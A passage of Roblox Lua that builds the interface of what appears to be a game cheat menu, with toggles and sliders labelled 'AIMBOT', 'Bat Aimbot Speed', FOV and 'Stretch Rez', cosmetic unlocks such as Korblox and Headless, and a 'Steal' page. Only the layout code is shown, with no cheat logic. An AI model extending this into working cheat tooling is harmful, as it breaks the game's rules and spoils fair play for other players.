G.TextLabel_42.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_42.Parent = G.Frame_72

G.TextLabel_43 = Instance.new("TextLabel")
G.TextLabel_43.BackgroundTransparency = 1
G.TextLabel_43.Position = UDim2.new(1, -44, 0, 11)
G.TextLabel_43.Size = UDim2.new(0, 30, 0, 14)
G.TextLabel_43.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_43.Text = "70"
G.TextLabel_43.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_43.TextSize = 10
G.TextLabel_43.TextXAlignment = Enum.TextXAlignment.Right
G.TextLabel_43.Parent = G.Frame_72

G.Frame_73 = Instance.new("Frame")
G.Frame_73.BackgroundColor3 = Color3.fromRGB(14, 30, 65)
G.Frame_73.BorderSizePixel = 0
G.Frame_73.Position = UDim2.new(0, 52, 0.5, -3)
G.Frame_73.Size = UDim2.new(1, -110, 0, 6)
G.Frame_73.Parent = G.Frame_72

G.UICorner_69 = Instance.new("UICorner")
G.UICorner_69.CornerRadius = UDim.new(0, 3)
G.UICorner_69.Parent = G.Frame_73

G.Frame_74 = Instance.new("Frame")
G.Frame_74.BackgroundColor3 = Color3.fromRGB(45, 130, 230)
G.Frame_74.BorderSizePixel = 0
G.Frame_74.Size = UDim2.new(0, 0, 1, 0)
G.Frame_74.Parent = G.Frame_73

G.UICorner_70 = Instance.new("UICorner")
G.UICorner_70.CornerRadius = UDim.new(0, 3)
G.UICorner_70.Parent = G.Frame_74

G.Frame_75 = Instance.new("Frame")
G.Frame_75.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G.Frame_75.BorderSizePixel = 0
G.Frame_75.Position = UDim2.new(0, -6, 0.5, -6)
G.Frame_75.Size = UDim2.new(0, 12, 0, 12)
G.Frame_75.ZIndex = 3
G.Frame_75.Parent = G.Frame_73

G.UICorner_71 = Instance.new("UICorner")
G.UICorner_71.CornerRadius = UDim.new(0, 6)
G.UICorner_71.Parent = G.Frame_75

G.TextButton_32 = Instance.new("TextButton")
G.TextButton_32.BackgroundTransparency = 1
G.TextButton_32.Position = UDim2.new(0, 0, 0, -12)
G.TextButton_32.Size = UDim2.new(1, 0, 1, 24)
G.TextButton_32.ZIndex = 4
G.TextButton_32.Text = ""
G.TextButton_32.Parent = G.Frame_73

G.Frame_76 = Instance.new("Frame")
G.Frame_76.BackgroundTransparency = 1
G.Frame_76.BorderSizePixel = 0
G.Frame_76.LayoutOrder = 65
G.Frame_76.Size = UDim2.new(1, 0, 0, 2)
G.Frame_76.Parent = G.WavePage_Visuals

G.Frame_77 = Instance.new("Frame")
G.Frame_77.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_77.BackgroundTransparency = 1
G.Frame_77.BorderSizePixel = 0
G.Frame_77.LayoutOrder = 10001
G.Frame_77.Size = UDim2.new(1, 0, 0, 40)
G.Frame_77.Parent = G.WavePage_Visuals

G.TextLabel_44 = Instance.new("TextLabel")
G.TextLabel_44.BackgroundTransparency = 1
G.TextLabel_44.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_44.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_44.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_44.Text = "FOV"
G.TextLabel_44.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_44.TextSize = 11
G.TextLabel_44.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_44.Parent = G.Frame_77

G.WaveTogglePill_19 = Instance.new("Frame")
G.WaveTogglePill_19.Name = "WaveTogglePill"
G.WaveTogglePill_19.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_19.BorderSizePixel = 0
G.WaveTogglePill_19.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_19.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_19.ZIndex = 7
G.WaveTogglePill_19:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_19.Parent = G.Frame_77

G.UICorner_72 = Instance.new("UICorner")
G.UICorner_72.CornerRadius = UDim.new(0, 9)
G.UICorner_72.Parent = G.WaveTogglePill_19

G.UIStroke_44 = Instance.new("UIStroke")
G.UIStroke_44.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_44.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_44.Parent = G.WaveTogglePill_19

G.WaveToggleDot_19 = Instance.new("Frame")
G.WaveToggleDot_19.Name = "WaveToggleDot"
G.WaveToggleDot_19.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_19.BorderSizePixel = 0
G.WaveToggleDot_19.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_19.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_19.ZIndex = 8
G.WaveToggleDot_19.Parent = G.WaveTogglePill_19

G.UICorner_73 = Instance.new("UICorner")
G.UICorner_73.CornerRadius = UDim.new(0, 6)
G.UICorner_73.Parent = G.WaveToggleDot_19

G.TextButton_33 = Instance.new("TextButton")
G.TextButton_33.BackgroundTransparency = 1
G.TextButton_33.BorderSizePixel = 0
G.TextButton_33.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_33.ZIndex = 9
G.TextButton_33.Text = ""
G.TextButton_33.Parent = G.WaveTogglePill_19

G.Frame_78 = Instance.new("Frame")
G.Frame_78.BackgroundTransparency = 1
G.Frame_78.BorderSizePixel = 0
G.Frame_78.LayoutOrder = 10006
G.Frame_78.Size = UDim2.new(1, 0, 0, 40)
G.Frame_78.Parent = G.WavePage_Visuals

G.TextLabel_45 = Instance.new("TextLabel")
G.TextLabel_45.BackgroundTransparency = 1
G.TextLabel_45.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_45.Size = UDim2.new(1, -108, 1, 0)
G.TextLabel_45.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_45.Text = "Korblox"
G.TextLabel_45.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_45.TextSize = 11
G.TextLabel_45.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_45.Parent = G.Frame_78

G.TextButton_34 = Instance.new("TextButton")
G.TextButton_34.BackgroundColor3 = Color3.fromRGB(20, 72, 160)
G.TextButton_34.BorderSizePixel = 0
G.TextButton_34.Position = UDim2.new(1, -88, 0.5, -13)
G.TextButton_34.Size = UDim2.new(0, 80, 0, 26)
G.TextButton_34.ZIndex = 8
G.TextButton_34.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_34.Text = "Off"
G.TextButton_34.TextColor3 = Color3.fromRGB(240, 245, 255)
G.TextButton_34.TextSize = 11
G.TextButton_34.Parent = G.Frame_78

G.UICorner_74 = Instance.new("UICorner")
G.UICorner_74.CornerRadius = UDim.new(0, 4)
G.UICorner_74.Parent = G.TextButton_34

G.UIStroke_45 = Instance.new("UIStroke")
G.UIStroke_45.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_45.Color = Color3.fromRGB(18, 38, 75)
G.UIStroke_45.Parent = G.TextButton_34

G.Frame_79 = Instance.new("Frame")
G.Frame_79.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_79.BackgroundTransparency = 1
G.Frame_79.BorderSizePixel = 0
G.Frame_79.LayoutOrder = 10005
G.Frame_79.Size = UDim2.new(1, 0, 0, 40)
G.Frame_79.Parent = G.WavePage_Visuals

G.TextLabel_46 = Instance.new("TextLabel")
G.TextLabel_46.BackgroundTransparency = 1
G.TextLabel_46.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_46.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_46.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_46.Text = "Headless"
G.TextLabel_46.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_46.TextSize = 11
G.TextLabel_46.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_46.Parent = G.Frame_79

G.WaveTogglePill_20 = Instance.new("Frame")
G.WaveTogglePill_20.Name = "WaveTogglePill"
G.WaveTogglePill_20.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_20.BorderSizePixel = 0
G.WaveTogglePill_20.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_20.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_20.ZIndex = 7
G.WaveTogglePill_20:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_20.Parent = G.Frame_79

G.UICorner_75 = Instance.new("UICorner")
G.UICorner_75.CornerRadius = UDim.new(0, 9)
G.UICorner_75.Parent = G.WaveTogglePill_20

G.UIStroke_46 = Instance.new("UIStroke")
G.UIStroke_46.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_46.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_46.Parent = G.WaveTogglePill_20

G.WaveToggleDot_20 = Instance.new("Frame")
G.WaveToggleDot_20.Name = "WaveToggleDot"
G.WaveToggleDot_20.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_20.BorderSizePixel = 0
G.WaveToggleDot_20.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_20.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_20.ZIndex = 8
G.WaveToggleDot_20.Parent = G.WaveTogglePill_20

G.UICorner_76 = Instance.new("UICorner")
G.UICorner_76.CornerRadius = UDim.new(0, 6)
G.UICorner_76.Parent = G.WaveToggleDot_20

G.TextButton_35 = Instance.new("TextButton")
G.TextButton_35.BackgroundTransparency = 1
G.TextButton_35.BorderSizePixel = 0
G.TextButton_35.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_35.ZIndex = 9
G.TextButton_35.Text = ""
G.TextButton_35.Parent = G.WaveTogglePill_20

G.Frame_80 = Instance.new("Frame")
G.Frame_80.BackgroundTransparency = 1
G.Frame_80.BorderSizePixel = 0
G.Frame_80.LayoutOrder = 69
G.Frame_80.Size = UDim2.new(1, 0, 0, 2)
G.Frame_80.Parent = G.WavePage_Visuals

G.Frame_81 = Instance.new("Frame")
G.Frame_81.BackgroundTransparency = 1
G.Frame_81.BorderSizePixel = 0
G.Frame_81.LayoutOrder = 70
G.Frame_81.Size = UDim2.new(1, 0, 0, 28)
G.Frame_81.Parent = G.WavePage_Visuals

G.TextLabel_47 = Instance.new("TextLabel")
G.TextLabel_47.BackgroundTransparency = 1
G.TextLabel_47.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_47.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_47.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_47.Text = "GEARS"
G.TextLabel_47.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_47.TextSize = 13
G.TextLabel_47.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_47.Parent = G.Frame_81

G.Frame_82 = Instance.new("Frame")
G.Frame_82.BackgroundTransparency = 1
G.Frame_82.BorderSizePixel = 0
G.Frame_82.LayoutOrder = 71
G.Frame_82.Size = UDim2.new(1, 0, 0, 2)
G.Frame_82.Parent = G.WavePage_Visuals

G.Frame_83 = Instance.new("Frame")
G.Frame_83.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_83.BackgroundTransparency = 1
G.Frame_83.BorderSizePixel = 0
G.Frame_83.LayoutOrder = 72
G.Frame_83.Size = UDim2.new(1, 0, 0, 40)
G.Frame_83.Parent = G.WavePage_Visuals

G.TextLabel_48 = Instance.new("TextLabel")
G.TextLabel_48.BackgroundTransparency = 1
G.TextLabel_48.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_48.Size = UDim2.new(1, -104, 1, 0)
G.TextLabel_48.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_48.Text = "Bat Skin"
G.TextLabel_48.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_48.TextSize = 11
G.TextLabel_48.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_48.Parent = G.Frame_83

G.TextButton_36 = Instance.new("TextButton")
G.TextButton_36.BackgroundColor3 = Color3.fromRGB(20, 72, 160)
G.TextButton_36.BorderSizePixel = 0
G.TextButton_36.Position = UDim2.new(1, -82, 0.5, -13)
G.TextButton_36.Size = UDim2.new(0, 70, 0, 26)
G.TextButton_36.AutoButtonColor = false
G.TextButton_36.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_36.Text = "OPEN"
G.TextButton_36.TextColor3 = Color3.fromRGB(240, 245, 255)
G.TextButton_36.TextSize = 11
G.TextButton_36.Parent = G.Frame_83

G.UICorner_77 = Instance.new("UICorner")
G.UICorner_77.CornerRadius = UDim.new(0, 4)
G.UICorner_77.Parent = G.TextButton_36

G.UIStroke_47 = Instance.new("UIStroke")
G.UIStroke_47.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_47.Color = Color3.fromRGB(18, 38, 75)
G.UIStroke_47.Parent = G.TextButton_36

G.Frame_84 = Instance.new("Frame")
G.Frame_84.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_84.BackgroundTransparency = 1
G.Frame_84.BorderSizePixel = 0
G.Frame_84.LayoutOrder = 73
G.Frame_84.Size = UDim2.new(1, 0, 0, 40)
G.Frame_84.Parent = G.WavePage_Visuals

G.TextLabel_49 = Instance.new("TextLabel")
G.TextLabel_49.BackgroundTransparency = 1
G.TextLabel_49.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_49.Size = UDim2.new(1, -104, 1, 0)
G.TextLabel_49.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_49.Text = "Medusa Skin"
G.TextLabel_49.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_49.TextSize = 11
G.TextLabel_49.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_49.Parent = G.Frame_84

G.TextButton_37 = Instance.new("TextButton")
G.TextButton_37.BackgroundColor3 = Color3.fromRGB(20, 72, 160)
G.TextButton_37.BorderSizePixel = 0
G.TextButton_37.Position = UDim2.new(1, -82, 0.5, -13)
G.TextButton_37.Size = UDim2.new(0, 70, 0, 26)
G.TextButton_37.AutoButtonColor = false
G.TextButton_37.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_37.Text = "OPEN"
G.TextButton_37.TextColor3 = Color3.fromRGB(240, 245, 255)
G.TextButton_37.TextSize = 11
G.TextButton_37.Parent = G.Frame_84

G.UICorner_78 = Instance.new("UICorner")
G.UICorner_78.CornerRadius = UDim.new(0, 4)
G.UICorner_78.Parent = G.TextButton_37

G.UIStroke_48 = Instance.new("UIStroke")
G.UIStroke_48.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_48.Color = Color3.fromRGB(18, 38, 75)
G.UIStroke_48.Parent = G.TextButton_37

G.Frame_85 = Instance.new("Frame")
G.Frame_85.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_85.BackgroundTransparency = 1
G.Frame_85.BorderSizePixel = 0
G.Frame_85.LayoutOrder = 10003
G.Frame_85.Size = UDim2.new(1, 0, 0, 40)
G.Frame_85.Parent = G.WavePage_Visuals

G.TextLabel_50 = Instance.new("TextLabel")
G.TextLabel_50.BackgroundTransparency = 1
G.TextLabel_50.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_50.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_50.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_50.Text = "Stretch Rez"
G.TextLabel_50.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_50.TextSize = 11
G.TextLabel_50.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_50.Parent = G.Frame_85

G.WaveTogglePill_21 = Instance.new("Frame")
G.WaveTogglePill_21.Name = "WaveTogglePill"
G.WaveTogglePill_21.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_21.BorderSizePixel = 0
G.WaveTogglePill_21.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_21.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_21.ZIndex = 7
G.WaveTogglePill_21:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_21.Parent = G.Frame_85

G.UICorner_79 = Instance.new("UICorner")
G.UICorner_79.CornerRadius = UDim.new(0, 9)
G.UICorner_79.Parent = G.WaveTogglePill_21

G.UIStroke_49 = Instance.new("UIStroke")
G.UIStroke_49.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_49.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_49.Parent = G.WaveTogglePill_21

G.WaveToggleDot_21 = Instance.new("Frame")
G.WaveToggleDot_21.Name = "WaveToggleDot"
G.WaveToggleDot_21.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_21.BorderSizePixel = 0
G.WaveToggleDot_21.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_21.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_21.ZIndex = 8
G.WaveToggleDot_21.Parent = G.WaveTogglePill_21

G.UICorner_80 = Instance.new("UICorner")
G.UICorner_80.CornerRadius = UDim.new(0, 6)
G.UICorner_80.Parent = G.WaveToggleDot_21

G.TextButton_38 = Instance.new("TextButton")
G.TextButton_38.BackgroundTransparency = 1
G.TextButton_38.BorderSizePixel = 0
G.TextButton_38.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_38.ZIndex = 9
G.TextButton_38.Text = ""
G.TextButton_38.Parent = G.WaveTogglePill_21

G.Frame_86 = Instance.new("Frame")
G.Frame_86.BackgroundTransparency = 1
G.Frame_86.BorderSizePixel = 0
G.Frame_86.LayoutOrder = 10000
G.Frame_86.Size = UDim2.new(1, 0, 0, 28)
G.Frame_86.Parent = G.WavePage_Visuals

G.TextLabel_51 = Instance.new("TextLabel")
G.TextLabel_51.BackgroundTransparency = 1
G.TextLabel_51.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_51.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_51.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_51.Text = "CAMERA"
G.TextLabel_51.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_51.TextSize = 13
G.TextLabel_51.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_51.Parent = G.Frame_86

G.WavePage_Steal = Instance.new("ScrollingFrame")
G.WavePage_Steal.Name = "WavePage_Steal"
G.WavePage_Steal.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.WavePage_Steal.BackgroundTransparency = 1
G.WavePage_Steal.BorderSizePixel = 0
G.WavePage_Steal.Position = UDim2.new(0, 3, 0, 92)
G.WavePage_Steal.Size = UDim2.new(1, -3, 1, -92)
G.WavePage_Steal.Visible = false
G.WavePage_Steal.ZIndex = 3
G.WavePage_Steal.AutomaticCanvasSize = Enum.AutomaticSize.Y
G.WavePage_Steal.CanvasSize = UDim2.new(0, 0, 0, 0)
G.WavePage_Steal.ScrollBarImageColor3 = Color3.fromRGB(45, 130, 230)
G.WavePage_Steal.ScrollBarImageTransparency = 0.5
G.WavePage_Steal.ScrollBarThickness = 3
G.WavePage_Steal.Parent = G.MainOuter

G.UIListLayout_6 = Instance.new("UIListLayout")
G.UIListLayout_6.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_6.Parent = G.WavePage_Steal

G.UIPadding_5 = Instance.new("UIPadding")
G.UIPadding_5.PaddingBottom = UDim.new(0, 12)
G.UIPadding_5.PaddingLeft = UDim.new(0, 8)
G.UIPadding_5.PaddingRight = UDim.new(0, 8)
G.UIPadding_5.PaddingTop = UDim.new(0, 6)
G.UIPadding_5.Parent = G.WavePage_Steal

G.WavePage_Combat = Instance.new("ScrollingFrame")
G.WavePage_Combat.Name = "WavePage_Combat"
G.WavePage_Combat.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.WavePage_Combat.BackgroundTransparency = 1
G.WavePage_Combat.BorderSizePixel = 0
G.WavePage_Combat.Position = UDim2.new(0, 3, 0, 92)
G.WavePage_Combat.Size = UDim2.new(1, -3, 1, -92)
G.WavePage_Combat.Visible = false
G.WavePage_Combat.ZIndex = 3
G.WavePage_Combat.AutomaticCanvasSize = Enum.AutomaticSize.Y
G.WavePage_Combat.CanvasSize = UDim2.new(0, 0, 0, 0)
G.WavePage_Combat.ScrollBarImageColor3 = Color3.fromRGB(45, 130, 230)
G.WavePage_Combat.ScrollBarImageTransparency = 0.5
G.WavePage_Combat.ScrollBarThickness = 3
G.WavePage_Combat.Parent = G.MainOuter

G.UIListLayout_7 = Instance.new("UIListLayout")
G.UIListLayout_7.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_7.Parent = G.WavePage_Combat

G.UIPadding_6 = Instance.new("UIPadding")
G.UIPadding_6.PaddingBottom = UDim.new(0, 12)
G.UIPadding_6.PaddingLeft = UDim.new(0, 8)
G.UIPadding_6.PaddingRight = UDim.new(0, 8)
G.UIPadding_6.PaddingTop = UDim.new(0, 6)
G.UIPadding_6.Parent = G.WavePage_Combat

G.Frame_87 = Instance.new("Frame")
G.Frame_87.BackgroundTransparency = 1
G.Frame_87.BorderSizePixel = 0
G.Frame_87.LayoutOrder = 1
G.Frame_87.Size = UDim2.new(1, 0, 0, 28)
G.Frame_87.Parent = G.WavePage_Combat

G.TextLabel_52 = Instance.new("TextLabel")
G.TextLabel_52.BackgroundTransparency = 1
G.TextLabel_52.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_52.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_52.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_52.Text = "AIMBOT"
G.TextLabel_52.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_52.TextSize = 13
G.TextLabel_52.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_52.Parent = G.Frame_87

G.Frame_88 = Instance.new("Frame")
G.Frame_88.BackgroundTransparency = 1
G.Frame_88.BorderSizePixel = 0
G.Frame_88.LayoutOrder = 81
G.Frame_88.Size = UDim2.new(1, 0, 0, 0)
G.Frame_88.Parent = G.WavePage_Combat

G.Frame_89 = Instance.new("Frame")
G.Frame_89.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_89.BackgroundTransparency = 1
G.Frame_89.BorderSizePixel = 0
G.Frame_89.LayoutOrder = 6
G.Frame_89.Size = UDim2.new(1, 0, 0, 40)
G.Frame_89.Parent = G.WavePage_Combat

G.TextLabel_53 = Instance.new("TextLabel")
G.TextLabel_53.BackgroundTransparency = 1
G.TextLabel_53.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_53.Size = UDim2.new(1, -120, 1, 0)
G.TextLabel_53.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_53.Text = "Bat Speed"
G.TextLabel_53.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_53.TextSize = 11
G.TextLabel_53.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_53.Parent = G.Frame_89

G.WaveTogglePill_22 = Instance.new("Frame")
G.WaveTogglePill_22.Name = "WaveTogglePill"
G.WaveTogglePill_22.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_22.BorderSizePixel = 0
G.WaveTogglePill_22.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_22.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_22.ZIndex = 7
G.WaveTogglePill_22:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_22.Parent = G.Frame_89

G.UICorner_81 = Instance.new("UICorner")
G.UICorner_81.CornerRadius = UDim.new(0, 9)
G.UICorner_81.Parent = G.WaveTogglePill_22

G.UIStroke_50 = Instance.new("UIStroke")
G.UIStroke_50.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_50.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_50.Parent = G.WaveTogglePill_22

G.WaveToggleDot_22 = Instance.new("Frame")
G.WaveToggleDot_22.Name = "WaveToggleDot"
G.WaveToggleDot_22.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_22.BorderSizePixel = 0
G.WaveToggleDot_22.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_22.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_22.ZIndex = 8
G.WaveToggleDot_22.Parent = G.WaveTogglePill_22

G.UICorner_82 = Instance.new("UICorner")
G.UICorner_82.CornerRadius = UDim.new(0, 6)
G.UICorner_82.Parent = G.WaveToggleDot_22

G.TextButton_39 = Instance.new("TextButton")
G.TextButton_39.BackgroundTransparency = 1
G.TextButton_39.BorderSizePixel = 0
G.TextButton_39.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_39.ZIndex = 9
G.TextButton_39.Text = ""
G.TextButton_39.Parent = G.WaveTogglePill_22

G.SizeDropdown_2 = Instance.new("TextButton")
G.SizeDropdown_2.Name = "SizeDropdown"
G.SizeDropdown_2.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.SizeDropdown_2.BorderSizePixel = 0
G.SizeDropdown_2.Position = UDim2.new(1, -106, 0.5, -11)
G.SizeDropdown_2.Size = UDim2.new(0, 34, 0, 22)
G.SizeDropdown_2.ZIndex = 9
G.SizeDropdown_2.Text = ""
G.SizeDropdown_2.Parent = G.Frame_89

G.UICorner_83 = Instance.new("UICorner")
G.UICorner_83.CornerRadius = UDim.new(0, 4)
G.UICorner_83.Parent = G.SizeDropdown_2

G.UIStroke_51 = Instance.new("UIStroke")
G.UIStroke_51.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_51.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_51.Parent = G.SizeDropdown_2

G.Arrow_2 = Instance.new("TextLabel")
G.Arrow_2.Name = "Arrow"
G.Arrow_2.BackgroundTransparency = 1
G.Arrow_2.Size = UDim2.new(1, 0, 1, 0)
G.Arrow_2.ZIndex = 10
G.Arrow_2.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.Arrow_2.Text = "▼"
G.Arrow_2.TextColor3 = Color3.fromRGB(70, 115, 180)
G.Arrow_2.TextSize = 16
G.Arrow_2.Parent = G.SizeDropdown_2

G.Frame_90 = Instance.new("Frame")
G.Frame_90.BackgroundTransparency = 1
G.Frame_90.BorderSizePixel = 0
G.Frame_90.ClipsDescendants = true
G.Frame_90.LayoutOrder = 7
G.Frame_90.Size = UDim2.new(1, 0, 0, 38)
G.Frame_90.Visible = false
G.Frame_90.Parent = G.WavePage_Combat

G.TextLabel_54 = Instance.new("TextLabel")
G.TextLabel_54.BackgroundTransparency = 1
G.TextLabel_54.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_54.Size = UDim2.new(1, -78, 1, 0)
G.TextLabel_54.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_54.Text = "Bat Aimbot Speed"
G.TextLabel_54.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_54.TextSize = 11
G.TextLabel_54.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_54.Parent = G.Frame_90

G.Frame_91 = Instance.new("Frame")
G.Frame_91.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.Frame_91.BorderSizePixel = 0
G.Frame_91.Position = UDim2.new(1, -64, 0.5, -13)
G.Frame_91.Size = UDim2.new(0, 54, 0, 26)
G.Frame_91.Parent = G.Frame_90

G.UICorner_84 = Instance.new("UICorner")
G.UICorner_84.CornerRadius = UDim.new(0, 6)
G.UICorner_84.Parent = G.Frame_91

G.UIStroke_52 = Instance.new("UIStroke")
G.UIStroke_52.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_52.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_52.Parent = G.Frame_91

G.TextBox_8 = Instance.new("TextBox")
G.TextBox_8.BackgroundTransparency = 1
G.TextBox_8.Position = UDim2.new(0, 3, 0, 0)
G.TextBox_8.Size = UDim2.new(1, -6, 1, 0)
G.TextBox_8.ZIndex = 8
G.TextBox_8.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_8.Text = "58"
G.TextBox_8.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextBox_8.TextSize = 11
G.TextBox_8.ClearTextOnFocus = false
G.TextBox_8.Parent = G.Frame_91

G.Frame_92 = Instance.new("Frame")
